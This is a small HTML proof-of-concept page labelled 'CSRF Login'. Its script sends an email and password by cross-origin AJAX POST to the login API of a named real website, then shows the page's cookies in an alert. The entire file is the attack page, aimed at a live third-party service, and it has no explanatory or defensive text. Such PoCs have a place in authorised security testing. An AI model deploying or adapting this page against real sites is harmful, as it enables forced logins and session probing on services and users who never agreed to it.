<html>
<head>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
    <script>
        function callLogin(){
            $.ajax({
                url: "https://www.perchlive.com/api/user/login/",
                type: 'POST',
                data: {
                    'email': $("#email").val(),
                    'password': $("#password").val()
                },
                complete: function(data){
                    alert('Cookie' + document.cookie);
               }
              });
        }
    </script> 
</head>
    <body>
        CSRF Login
        <form method="POST" >
            <input id="email" type="text">
            <input id="password" type="text">
            <a href="#" onClick="callLogin()">Login</a>
        </form> 
    </body>
</html>
